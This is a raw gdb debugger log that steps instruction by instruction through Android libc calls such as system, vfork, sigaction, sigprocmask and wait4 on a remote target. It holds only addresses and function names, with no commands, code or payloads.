0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f28fe8 in sigprocmask ()
(gdb) 
0xb6f28fea in sigprocmask ()
(gdb) 
0xb6f28ffe in sigprocmask ()
(gdb) 
0xb6f29000 in sigprocmask ()
(gdb) 
0xb6f29002 in sigprocmask ()
(gdb) 
0xb6f29004 in sigprocmask ()
(gdb) 
0xb6f29006 in sigprocmask ()
(gdb) 
0xb6f29008 in sigprocmask ()
(gdb) 
0xb6f2900c in sigprocmask ()
(gdb) 
0xb6f2900e in sigprocmask ()
(gdb) 
0xb6f29010 in sigprocmask ()
(gdb) 
0xb6f29012 in sigprocmask ()
(gdb) 
0xb6f29020 in sigprocmask ()
(gdb) 
0xb6f29022 in sigprocmask ()
(gdb) 
0xb6f29024 in sigprocmask ()
(gdb) 
0xb6f29026 in sigprocmask ()
(gdb) 
0xb51ee014 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee016 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee018 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee020 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee022 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee024 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee026 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee028 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee02c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee030 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee032 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee034 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee036 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee03a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee03e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee040 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee042 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee044 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51e5080 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5084 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5088 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb521942c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219430 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219434 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219438 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb521943c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219440 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee048 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee04c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee04e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee050 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee052 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee054 in sigprocmask () from target:/system/lib/libc.so
(gdb) 

0xb51ee056 in sigprocmask () from target:/system/lib/libc.so
(gdb) 

0xb51ee05c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee05e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee060 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee062 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee064 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee066 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee068 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee06a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee06c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb6f29028 in sigprocmask ()
(gdb) 
[New LWP 17507]

0xb6f2902a in sigprocmask ()
(gdb) 

0xb6f2902c in sigprocmask ()
(gdb) 

0xb6f2902e in sigprocmask ()
(gdb) 

0xb6f29030 in sigprocmask ()
(gdb) 
0xb6f29032 in sigprocmask ()
(gdb) 
0xb6f29034 in sigprocmask ()
(gdb) 
0xb6f29036 in sigprocmask ()
(gdb) 
0xb6f29038 in sigprocmask ()
(gdb) 
0xb5216b88 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e5a70 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5a74 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5a78 in vfork@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e7500 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7504 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7508 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e750c in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7510 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7514 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7518 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7520 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb51e7524 in vfork () from target:/system/lib/libc.so
(gdb) 
0xb5216b8c in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b8e in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b92 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b94 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b96 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b98 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b9a in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b9c in system () from target:/system/lib/libc.so
(gdb) 
0xb5216b9e in system () from target:/system/lib/libc.so
(gdb) 
0xb51e4a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f29208 in sigaction ()
(gdb) 
0xb6f2920a in sigaction ()
(gdb) 
0xb6f2920c in sigaction ()
(gdb) 
0xb6f2920e in sigaction ()
(gdb) 
0xb6f29210 in sigaction ()
(gdb) 
0xb6f29212 in sigaction ()
(gdb) 
0xb6f29214 in sigaction ()
(gdb) 
0xb6f29216 in sigaction ()
(gdb) 
0xb6f29218 in sigaction ()
(gdb) 
0xb6f2921a in sigaction ()
(gdb) 
0xb6f2921c in sigaction ()
(gdb) 
0xb6f2921e in sigaction ()
(gdb) 
0xb6f29220 in sigaction ()
(gdb) 
0xb6f29222 in sigaction ()
(gdb) 
0xb6f29224 in sigaction ()
(gdb) 
0xb6f29228 in sigaction ()
(gdb) 
0xb6f2922a in sigaction ()
(gdb) 
0xb6f2922e in sigaction ()
(gdb) 
0xb6f29230 in sigaction ()
(gdb) 
0xb6f29258 in sigaction ()
(gdb) 
0xb6f2925a in sigaction ()
(gdb) 
0xb6f2925c in sigaction ()
(gdb) 
0xb6f2925e in sigaction ()
(gdb) 
0xb6f2926c in sigaction ()
(gdb) 
0xb6f2926e in sigaction ()
(gdb) 
0xb6f29270 in sigaction ()
(gdb) 
0xb6f29272 in sigaction ()
(gdb) 
0xb6f29274 in sigaction ()
(gdb) 
0xb6f29276 in sigaction ()
(gdb) 
0xb6f29278 in sigaction ()
(gdb) 
0xb6f2927a in sigaction ()
(gdb) 
0xb6f2927c in sigaction ()
(gdb) 
0xb6f2927e in sigaction ()
(gdb) 
0xb6f29280 in sigaction ()
(gdb) 
0xb6f29282 in sigaction ()
(gdb) 
0xb6f29286 in sigaction ()
(gdb) 
0xb51edd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51e532c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb5219504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb521950c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5216ba2 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216ba4 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216ba6 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216ba8 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e4a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f29208 in sigaction ()
(gdb) 
0xb6f2920a in sigaction ()
(gdb) 
0xb6f2920c in sigaction ()
(gdb) 
0xb6f2920e in sigaction ()
(gdb) 
0xb6f29210 in sigaction ()
(gdb) 
0xb6f29212 in sigaction ()
(gdb) 
0xb6f29214 in sigaction ()
(gdb) 
0xb6f29216 in sigaction ()
(gdb) 
0xb6f29218 in sigaction ()
(gdb) 
0xb6f2921a in sigaction ()
(gdb) 
0xb6f2921c in sigaction ()
(gdb) 
0xb6f2921e in sigaction ()
(gdb) 
0xb6f29220 in sigaction ()
(gdb) 
0xb6f29222 in sigaction ()
(gdb) 
0xb6f29224 in sigaction ()
(gdb) 
0xb6f29228 in sigaction ()
(gdb) 
0xb6f2922a in sigaction ()
(gdb) 
0xb6f2922e in sigaction ()
(gdb) 
0xb6f29230 in sigaction ()
(gdb) 
0xb6f29258 in sigaction ()
(gdb) 
0xb6f2925a in sigaction ()
(gdb) 
0xb6f2925c in sigaction ()
(gdb) 
0xb6f2925e in sigaction ()
(gdb) 
0xb6f2926c in sigaction ()
(gdb) 
0xb6f2926e in sigaction ()
(gdb) 
0xb6f29270 in sigaction ()
(gdb) 
0xb6f29272 in sigaction ()
(gdb) 
0xb6f29274 in sigaction ()
(gdb) 
0xb6f29276 in sigaction ()
(gdb) 
0xb6f29278 in sigaction ()
(gdb) 
0xb6f2927a in sigaction ()
(gdb) 
0xb6f2927c in sigaction ()
(gdb) 
[New LWP 17536]

0xb6f2927e in sigaction ()
(gdb) 

0xb6f29280 in sigaction ()
(gdb) 
0xb6f29282 in sigaction ()
(gdb) 
0xb6f29286 in sigaction ()
(gdb) 
0xb51edd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7c in sigaction () from target:/system/lib/libc.so
(gdb) 


0xb51edd7e in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb51edd80 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb51edd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd84 in sigaction () from target:/system/lib/libc.so

(gdb) 
0xb51edd86 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb51edd88 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb51edd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51e532c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb5219504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb521950c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5216bac in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bae in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bb0 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bb2 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bb4 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bb6 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e5aa0 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5aa4 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5aa8 in waitpid@plt () from target:/system/lib/libc.so
(gdb) 
0xb51f087a in waitpid () from target:/system/lib/libc.so
(gdb) 
0xb51f087c in waitpid () from target:/system/lib/libc.so
(gdb) 
0xb524171c in ?? () from target:/system/lib/libc.so
(gdb) 
0xb5241720 in ?? () from target:/system/lib/libc.so
(gdb) 
0xb5241724 in ?? () from target:/system/lib/libc.so
(gdb) 
0xb51e54a0 in wait4@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e54a4 in wait4@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e54a8 in wait4@plt () from target:/system/lib/libc.so
(gdb) 
0xb521ac1c in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb521ac20 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb521ac24 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb521ac28 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb521ac2c in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb521ac30 in wait4 () from target:/system/lib/libc.so
(gdb) 
0xb5216bba in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bbe in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bcc in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bce in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bd0 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bd2 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e45ac in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e45b0 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e45b4 in sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f28fbc in sigprocmask ()
(gdb) 
0xb6f28fc0 in sigprocmask ()
(gdb) 
0xb6f28fc2 in sigprocmask ()
(gdb) 
0xb6f28fc4 in sigprocmask ()
(gdb) 
0xb6f28fc6 in sigprocmask ()
(gdb) 
0xb6f28fc8 in sigprocmask ()
(gdb) 
0xb6f28fca in sigprocmask ()
(gdb) 
0xb6f28fcc in sigprocmask ()
(gdb) 
0xb6f28fce in sigprocmask ()
(gdb) 
0xb6f28fd0 in sigprocmask ()
(gdb) 
0xb6f28fd2 in sigprocmask ()
(gdb) 
0xb6f28fd4 in sigprocmask ()
(gdb) 
0xb6f28fd6 in sigprocmask ()
(gdb) 
0xb6f28fd8 in sigprocmask ()
(gdb) 
0xb6f28fda in sigprocmask ()
(gdb) 
0xb6f29006 in sigprocmask ()
(gdb) 
0xb6f29008 in sigprocmask ()
(gdb) 
0xb6f2900c in sigprocmask ()
(gdb) 
0xb6f2900e in sigprocmask ()
(gdb) 
0xb6f29010 in sigprocmask ()
(gdb) 
0xb6f29012 in sigprocmask ()
(gdb) 
0xb6f29020 in sigprocmask ()
(gdb) 
0xb6f29022 in sigprocmask ()
(gdb) 
0xb6f29024 in sigprocmask ()
(gdb) 
0xb6f29026 in sigprocmask ()
(gdb) 
0xb51ee014 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee016 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee018 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee01e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee020 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee022 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee024 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee026 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee028 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee02c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee030 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee032 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee034 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee036 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee03a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee03e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee040 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee042 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee044 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51e5080 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5084 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5088 in __rt_sigprocmask@plt () from target:/system/lib/libc.so
(gdb) 
0xb521942c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219430 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219434 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219438 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb521943c in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb5219440 in __rt_sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee048 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee04c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee04e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee054 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee056 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee05c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee05e in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee060 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee062 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee064 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee066 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee068 in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee06a in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb51ee06c in sigprocmask () from target:/system/lib/libc.so
(gdb) 
0xb6f29028 in sigprocmask ()
(gdb) 
0xb6f2902a in sigprocmask ()
(gdb) 
0xb6f2902c in sigprocmask ()
(gdb) 
0xb6f2902e in sigprocmask ()
(gdb) 
0xb6f29030 in sigprocmask ()
(gdb) 
0xb6f29032 in sigprocmask ()
(gdb) 
0xb6f29034 in sigprocmask ()
(gdb) 
0xb6f29036 in sigprocmask ()
(gdb) 
0xb6f29038 in sigprocmask ()
(gdb) 
0xb5216bd6 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bd8 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bda in system () from target:/system/lib/libc.so
(gdb) 
0xb5216bdc in system () from target:/system/lib/libc.so
(gdb) 

0xb51e4a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 


0xb51e4a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 

0xb6f29208 in sigaction ()
(gdb) 

0xb6f2920a in sigaction ()
(gdb) 

0xb6f2920c in sigaction ()
(gdb) 
0xb6f2920e in sigaction ()
(gdb) 
0xb6f29210 in sigaction ()
(gdb) 
0xb6f29212 in sigaction ()
(gdb) 
0xb6f29214 in sigaction ()
(gdb) 
0xb6f29216 in sigaction ()
(gdb) 
[New LWP 17580]

0xb6f29218 in sigaction ()
(gdb) 

0xb6f2921a in sigaction ()
(gdb) 
0xb6f2921c in sigaction ()
(gdb) 
0xb6f2921e in sigaction ()
(gdb) 
0xb6f29220 in sigaction ()
(gdb) 
0xb6f29222 in sigaction ()
(gdb) 
0xb6f29224 in sigaction ()
(gdb) 
0xb6f29228 in sigaction ()
(gdb) 
0xb6f2922a in sigaction ()
(gdb) 
0xb6f2922e in sigaction ()
(gdb) 
0xb6f29230 in sigaction ()
(gdb) 
0xb6f29258 in sigaction ()
(gdb) 
0xb6f2925a in sigaction ()
(gdb) 
0xb6f2925c in sigaction ()
(gdb) 
0xb6f2925e in sigaction ()
(gdb) 
0xb6f2926c in sigaction ()
(gdb) 
0xb6f2926e in sigaction ()
(gdb) 
0xb6f29270 in sigaction ()
(gdb) 
0xb6f29272 in sigaction ()
(gdb) 
0xb6f29274 in sigaction ()
(gdb) 
0xb6f29276 in sigaction ()
(gdb) 
0xb6f29278 in sigaction ()
(gdb) 
0xb6f2927a in sigaction ()
(gdb) 
0xb6f2927c in sigaction ()
(gdb) 
0xb6f2927e in sigaction ()
(gdb) 
0xb6f29280 in sigaction ()
(gdb) 
0xb6f29282 in sigaction ()
(gdb) 
0xb6f29286 in sigaction ()
(gdb) 
0xb51edd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd78 in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb51edd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd8c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd90 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd92 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd96 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd9a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd9e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddac in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddae in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddba in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51e532c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb5219504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb521950c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddde in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5216be0 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216be2 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216be4 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216be6 in system () from target:/system/lib/libc.so
(gdb) 
0xb51e4a44 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a48 in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4a4c in sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb6f29208 in sigaction ()
(gdb) 
0xb6f2920a in sigaction ()
(gdb) 
